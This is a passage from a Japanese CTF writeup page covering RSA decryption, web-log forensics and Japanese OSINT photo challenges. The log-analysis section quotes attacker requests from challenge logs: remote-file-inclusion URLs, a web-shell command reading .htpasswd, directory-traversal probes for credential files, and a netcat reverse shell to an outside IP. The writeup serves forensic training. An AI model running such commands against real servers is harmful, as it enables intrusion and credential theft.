@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Digital Overdose 2021 Autumn CTF Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.co.uk/ 2900点を獲得し、チームとしては68位、個人では38位でした。 なお、参加チームは719、参加プレーヤーは11" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="Digital Overdose 2021 Autumn CTF Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.co.uk/ 2900点を獲得し、チームとしては68位、個人では38位でした。 なお、参加チームは719、参加プレーヤーは11" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2021/" />
+<meta property="article:published_time" content="2021-10-11T20:00:00+09:00" />
+<meta property="article:modified_time" content="2021-10-13T23:00:00+09:00" />
+<meta itemprop="name" content="Digital Overdose 2021 Autumn CTF Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.co.uk/ 2900点を獲得し、チームとしては68位、個人では38位でした。 なお、参加チームは719、参加プレーヤーは11">
+<meta itemprop="datePublished" content="2021-10-11T20:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-10-13T23:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="3449">
+
+
+
+<meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Digital Overdose 2021 Autumn CTF Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.co.uk/ 2900点を獲得し、チームとしては68位、個人では38位でした。 なお、参加チームは719、参加プレーヤーは11"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Digital Overdose 2021 Autumn CTF Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-10-11 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#crypto-constant-primes-75-points">[Crypto]: Constant Primes (75 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#log-analysis-part-1---ingress-100-points">[Log Analysis]: Part 1 - Ingress (100 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#log-analysis-part-2---investigation-150-points">[Log Analysis]: Part 2 - Investigation (150 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-1---dare-enter-the-mirror-world-50-points">[OSINT: Tour de Japan]: 1 - Dare enter the mirror world (50 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-2---the-land-of-culture-75-points">[OSINT: Tour de Japan]: 2 - The land of culture (75 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-3---a-childhood-favourite-100-points">[OSINT: Tour de Japan]: 3 - A childhood favourite (100 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-4---one-of-the-classics-100-points">[OSINT: Tour de Japan]: 4 - One of the classics (100 points)</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-5a---the-central-hub-75-points">[OSINT: Tour de Japan]: 5.a - The Central Hub (75 points)</a>
+      <ul>
+        <li><a href="#challenge-7">Challenge</a></li>
+        <li><a href="#solution-7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-5b---this-way-emperor-naruhito-75-points">[OSINT: Tour de Japan]: 5.b - This way, Emperor Naruhito (75 points)</a>
+      <ul>
+        <li><a href="#challenge-8">Challenge</a></li>
+        <li><a href="#solution-8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-6---along-the-waterways-we-go-75-points">[OSINT: Tour de Japan]: 6 - Along the waterways we go (75 points)</a>
+      <ul>
+        <li><a href="#challenge-9">Challenge</a></li>
+        <li><a href="#solution-9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-7---a-box-of-mystery-100-points">[OSINT: Tour de Japan]: 7 - A box of mystery (100 points)</a>
+      <ul>
+        <li><a href="#challenge-10">Challenge</a></li>
+        <li><a href="#solution-10">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-8---a-staple-drink-of-japan-50-points">[OSINT: Tour de Japan]: 8 - A staple drink of Japan (50 points)</a>
+      <ul>
+        <li><a href="#challenge-11">Challenge</a></li>
+        <li><a href="#solution-11">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-9---a-concrete-jungles-forest-heart-50-points">[OSINT: Tour de Japan]: 9 - A concrete jungle&rsquo;s forest heart (50 points)</a>
+      <ul>
+        <li><a href="#challenge-12">Challenge</a></li>
+        <li><a href="#solution-12">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-10---an-answer-in-plain-sight-250-points">[OSINT: Tour de Japan]: 10 - An answer in plain sight (250 points)</a>
+      <ul>
+        <li><a href="#challenge-13">Challenge</a></li>
+        <li><a href="#solution-13">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-11---an-island-of-mascots-150-points">[OSINT: Tour de Japan]: 11 - An island of mascots (150 points)</a>
+      <ul>
+        <li><a href="#challenge-14">Challenge</a></li>
+        <li><a href="#solution-14">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-12---a-story-of-the-ages-75-points">[OSINT: Tour de Japan]: 12 - A story of the ages (75 points)</a>
+      <ul>
+        <li><a href="#challenge-15">Challenge</a></li>
+        <li><a href="#solution-15">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-tour-de-japan-13---the-river-of-sakura-75-points">[OSINT: Tour de Japan]: 13 - The river of Sakura (75 points)</a>
+      <ul>
+        <li><a href="#challenge-16">Challenge</a></li>
+        <li><a href="#solution-16">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fdigitaloverdose_ractf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://digitaloverdose.ractf.co.uk/">https://digitaloverdose.ractf.co.uk/</a>
+<br /><br /></p>
+<p>2900点を獲得し、チームとしては68位、個人では38位でした。</p>
+<p>なお、参加チームは719、参加プレーヤーは1118人だったようです。</p>
+<p><br><br></p>
+<p>チーム順位：</p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_Score1.png" alt="ractf_2021_Score1.png">
+<p><br><br></p>
+<p>個人順位：</p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_Score2.png" alt="ractf_2021_Score2.png">
+<p><br><br>
+チャレンジのリストです。</p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall1.png" alt="ractf_2021_chall1.png">
+<br>
+<p>普段はOSINT系のチャレンジはあんまりやらないんですが、日本の場所を当てるやつだったので頑張って全部解きました。</p>
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall2.png" alt="ractf_2021_chall2.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall3.png" alt="ractf_2021_chall3.png">
+<br>
+<p>これは、Rainbow Tableを参照したり、John the ripper や Hashcat を使って全部解けました。</p>
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall4.png" alt="ractf_2021_chall4.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall5.png" alt="ractf_2021_chall5.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall6.png" alt="ractf_2021_chall6.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall6.png" alt="ractf_2021_chall6.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall7.png" alt="ractf_2021_chall7.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall8.png" alt="ractf_2021_chall8.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall9.png" alt="ractf_2021_chall9.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall10.png" alt="ractf_2021_chall10.png">
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/ractf_2021_chall11.png" alt="ractf_2021_chall11.png">
+<br>
+<p><br /><br /></p>
+<h2 id="crypto-constant-primes-75-points">[Crypto]: Constant Primes (75 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>RSA is the hardest and most non-repetitive asymmetric key encryption.
+<br /><br />
+This is your first time seeing one, right? Well be prepared, you will not find the flag.
+<br /><br />
+I have given you this key (id_rsa file), it’s this random base64 string, no way you&rsquo;ll know what to do with it.
+<br /><br />
+The ciphertext is 0x2085f3d3573cd709fad84bed9fe8dde419fb7c8e96aa95ec4651a3bc07b5552f321e03404943744d931a4a51a817cf190880a5efbf94aa828c45da5b31dcdefc</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>id_rsa (RSA PRIVATE KEY)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>まず、ssh-keygen を実行してみたのですが、エラーになりました。。</p>
+<pre>
+$ ssh-keygen -f id_rsa -e -m pem | openssl asn1parse
+Load key "id_rsa": Invalid key length
+Error: offset out of range
+
+</pre>
+<p><br /></p>
+<p>以下のコードで、<code>n</code> と <code>e</code> は取れました。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;id_rsa&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<p>実行結果：</p>
+<pre>
+$ ./read_key.py
+6682669787535606635993287896641983501298577520322405381880667699429293248249880135523414618303313461640928583929883384586229757283439591741435143918813267
+65537
+</pre>
+<br>
+<p>n, e, c が揃えば、あとは RsaCtfTool.py で解けます。</p>
+<p>反転したものが出てくるので、rev してフラグが得られます。</p>
+<pre>
+$ ~/Python3/RsaCtfTool/RsaCtfTool.py -n 6682669787535606635993287896641983501298577520322405381880667699429293248249880135523414618303313461640928583929883384586229757283439591741435143918813267 -e 65537 --uncipher 1703380908157528283172041137132390349496157838445725605013427432689517712852707895688494322667218403379009536599334770578485119117275052717689607980637948
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}drah_taht_t0n_s1_ASR{OD'
+
+$ echo }drah_taht_t0n_s1_ASR{OD | rev
+DO{RSA_1s_n0t_that_hard}
+
+</pre>
+<p><br /></p>
+<p>Flag: <code>DO{RSA_1s_n0t_that_hard}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="log-analysis-part-1---ingress-100-points">[Log Analysis]: Part 1 - Ingress (100 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Our website was hacked recently and the attackers completely ransomwared our server!
+<br /><br />
+We&rsquo;ve recovered it now, but we don&rsquo;t want it to happen again.
+<br /><br />
+Here are the logs from before the attack, can you find out what happened?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>attack.log</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>ログはスペース文字（white space）で区切られていて、フィールドは以下のようになっています。</p>
+<pre>
+$ head -n1 attack.log
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+</pre>
+<br>
+<p>6番目のcs-uri-queryを見ていくと、Base64でエンコードされた文字列が出てきます。</p>
+<pre>
+$ cat attack.log | cut -d" " -f6 | sort -u
+-
+cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd
+cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==
+:
+(snip)
+:
+</pre>
+<br>
+<p>これをデコードするとフラグが得られます。</p>
+<pre>
+$ echo RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== | base64 -d
+DO{better_remove_that_backdoor}
+</pre>
+<br>
+<p>なお、このときのattackerのIPアドレスは 20.132.161.193 なので、それでフィルターすると、より詳しく攻撃内容がわかります。</p>
+<pre>
+$ grep RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ attack.log | cut -d" " -f9
+20.132.161.193
+
+$ grep 20.132.161.193 attack.log | cut -d" " -f1,2,3,4,5,6
+2021-09-06 20:43:00 135.233.142.30 GET runtime-es2015.43df09c2199138dc23a5.js -
+2021-09-06 20:43:00 135.233.142.30 GET main-es2015.5dfab9e1774faff15645.js -
+2021-09-06 20:43:00 135.233.142.30 GET faq locale=http://bglzqntj.io:19/bglzqntj.txt%00
+2021-09-06 20:43:21 135.233.142.30 GET runtime-es2015.43df09c2199138dc23a5.js -
+2021-09-06 20:43:21 135.233.142.30 GET assets/images/community/cal-bg.svg -
+2021-09-06 20:43:21 135.233.142.30 GET assets/images/ctf/2021-01/offsec-logo.svg -
+2021-09-06 20:43:21 135.233.142.30 GET faq locale=http://ronworwu.io:0/ronworwu.txt%00
+2021-09-06 20:43:33 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js -
+2021-09-06 20:43:33 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js -
+2021-09-06 20:43:33 135.233.142.30 GET runtime-es5.43df09c2199138dc23a5.js -
+2021-09-06 20:43:33 135.233.142.30 GET faq locale=http://rnugvbtp.io:26/rnugvbtp.txt%00
+2021-09-06 20:43:51 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js -
+2021-09-06 20:43:51 135.233.142.30 GET faq locale=http://xyztftsz.io:7/xyztftsz.txt%00
+2021-09-06 20:43:59 135.233.142.30 GET assets/images/community/cal-bg.svg -
+2021-09-06 20:43:59 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js -
+2021-09-06 20:43:59 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js -
+2021-09-06 20:43:59 135.233.142.30 GET faq locale=http://ejlaadxk.io:4/ejlaadxk.txt%00
+2021-09-06 20:44:19 135.233.142.30 GET ywesusnz cmd%3Dcd+..
+2021-09-06 20:44:45 135.233.142.30 GET ywesusnz cmd%3Dpwd
+2021-09-06 20:45:04 135.233.142.30 GET ywesusnz cmd%3Dwhoami
+2021-09-06 20:45:16 135.233.142.30 GET ywesusnz cmd%3Dhostname
+2021-09-06 20:45:46 135.233.142.30 GET ywesusnz cmd%3Dnetstat+-peanut
+2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd
+2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==
+2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213
+</pre>
+<p><br /></p>
+<p>Flag: <code>DO{better_remove_that_backdoor}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="log-analysis-part-2---investigation-150-points">[Log Analysis]: Part 2 - Investigation (150 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>Thanks for finding the RFI vulnerability in our FAQ.  We have fixed it now, but we don&rsquo;t understand how the attacker found it so quickly.
+<br /><br />
+We suspect it might be an inside job, but maybe they got the source another way.  Here are the logs for the month prior to the attack, can you see anything suspicious?
+<br /><br />
+Please submit the attackers IP as the flag as follow, DO{x.x.x.x}</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>more.log</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>これはイベント中に解けなかったやつなんですが、他の方のWriteupを見ると、DO{45.85.1.176} がフラグだったみたいですね。</p>
+<p>これはおかしいです。おそらくフラグが間違って設定されていたと思われます。</p>
+<p>45.85.1.176 はサーバのIPアドレスなので、attacker&rsquo;s IP ではありません。</p>
+<p>3番目に出てくる s-ip は、server IPで、9番目に出てくる c-ip が client IP です。実際、s-ipは、全てのログで 45.85.1.176 になっています（以下）。</p>
+<pre>
+$ head -n1 attack.log
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+
+$ cat more.log | cut -d" " -f3 | sort -u
+45.85.1.176
+</pre>
+<br>
+Attackerのログは、実は結構明確で、directory traversalを使っていろいろファイルを取ろうと試みていて、ほとんどが404でエラーになってます。
+<pre>
+$ grep "\.\.//" more.log | head | cut -d" " -f4,5,6,7,8,9,11,12
+GET ../..//passwords.bckp - 443 - 200.13.84.124 - 404
+GET ..//configuration.3 - 443 - 200.13.84.124 - 404
+GET ../../..//db_config.1 - 443 - 200.13.84.124 - 404
+GET ../..//login.txt - 443 - 200.13.84.124 - 404
+GET ../..//auth.zip - 443 - 200.13.84.124 - 404
+GET ..//db.saved - 443 - 200.13.84.124 - 404
+GET ..//auth.saved - 443 - 200.13.84.124 - 404
+GET ../../..//db_config.old - 443 - 200.13.84.124 - 404
+GET ../../..//admin.older - 443 - 200.13.84.124 - 404
+GET ..//login.bckp - 443 - 200.13.84.124 - 404
+</pre>
+<p><br />
+まぁ、これだけで attacker&rsquo;s IP は 200.13.84.124 でほぼ確定なんですが、更に見ていくと、ほとんどのGETリクエストが404で失敗している中で、ひとつだけ200 OKで成功しているログがあります。</p>
+<p>以下で、backup.zipの取得に成功しています。チャレンジ文の、<code>maybe they got the source</code> にマッチするものと考えられます。</p>
+<pre>
+$ grep 200.13.84.124 more.log | grep -v 404
+2021-08-03 08:55:00 45.85.1.176 GET backup.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 200 0 0 25
+</pre>
+<p><br /></p>
+<p>ちなみに、このときのUser-Agentも怪しくて、RE97czNjcjN0X19fYWdlbnR9 はデコードすると別フラグが得られます。(Part 3 - Backup Policyのフラグだったようです。)</p>
+<pre>
+$ echo RE97czNjcjN0X19fYWdlbnR9 | base64 -d
+DO{s3cr3t___agent}
+</pre>
+<p><br /></p>
+<p>ということで、フラグは</p>
+<p>Flag: <s><code>DO{45.85.1.176}</code></s></p>
+<p>ではなく、</p>
+<p>Flag: <code>DO{200.13.84.124}</code></p>
+<p>だと思います。</p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-1---dare-enter-the-mirror-world-50-points">[OSINT: Tour de Japan]: 1 - Dare enter the mirror world (50 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>Where was this photo taken from?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_1.jfif" alt="Challenge_1.jfif">
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>表参道にある東急プラザの入り口ですね。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Tokyu_Plaza}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-2---the-land-of-culture-75-points">[OSINT: Tour de Japan]: 2 - The land of culture (75 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>Where was this photo taken from?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_2.jfif" alt="Challenge_2.jfif">
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p>拡大してみると、秋葉原 COMIC ZIN があるのが見えるので、これをヒントにGoogle Mapを使いました。</p>
+<p>対面から写真を撮っているので、Mapをベースに対面を確認すると、そこにはビックカメラがあります。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Bic_Camera_Akiba}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-3---a-childhood-favourite-100-points">[OSINT: Tour de Japan]: 3 - A childhood favourite (100 points)</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
+<blockquote>
+<p>Where is this Pokémon?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_3.jfif" alt="Challenge_3.jfif">
+<p><br /></p>
+<h3 id="solution-5">Solution</h3>
+<p><code>ミジュマル</code> というポケモンなのはすぐわかったんですが、場所を見つけるのに苦労しました。</p>
+<p>Google Lensでサーチしたら、<code>池袋</code> の <code>サンシャインシティ</code> にある <code>ポケモンセンターメガ東京</code> という場所なのがわかりました。</p>
+<p>トライ・アンド・エラーした結果、<code>サンシャインシティ</code> がフラグでした。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Sunshine_City}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-4---one-of-the-classics-100-points">[OSINT: Tour de Japan]: 4 - One of the classics (100 points)</h2>
+<hr>
+<h3 id="challenge-6">Challenge</h3>
+<blockquote>
+<p>Where was this photo taken from?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_4.jpeg" alt="Challenge_4.jpeg">
+<p><br /></p>
+<h3 id="solution-6">Solution</h3>
+<p>ストリートファイターのリュウの置物があるお店のようです。</p>
+<p><code>ryu hadouken otaku shop</code> でGoogleサーチしたら、渋谷のパルコにあるお店のようですね。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Shibuya_Parco}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-5a---the-central-hub-75-points">[OSINT: Tour de Japan]: 5.a - The Central Hub (75 points)</h2>
+<hr>
+<h3 id="challenge-7">Challenge</h3>
+<blockquote>
+<p>What building is in this picture?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_5.jfif" alt="Challenge_5.jfif">
+<p><br /></p>
+<h3 id="solution-7">Solution</h3>
+<p>これは調べるまでもなく、東京駅です。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Tokyo_Station}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-5b---this-way-emperor-naruhito-75-points">[OSINT: Tour de Japan]: 5.b - This way, Emperor Naruhito (75 points)</h2>
+<hr>
+<h3 id="challenge-8">Challenge</h3>
+<blockquote>
+<p>Where was this photo taken from?</p>
+</blockquote>
+<p>（写真は 5.a と同じです。）</p>
+<p><br /></p>
+<h3 id="solution-8">Solution</h3>
+<p>これは相当悩みました。。</p>
+<p><s>DO{Tokyo_Marunouchi_Minamiguchi}</s><br>
+<s>DO{Marunouchi_Minamiguchi}</s><br>
+<s>DO{Marunouchi_Minamiguchi}</s><br>
+<s>DO{Tokyo_Station_Marunouchi_Building}</s><br>
+<s>DO{Tokyo_Station_Marunouchi}</s><br>
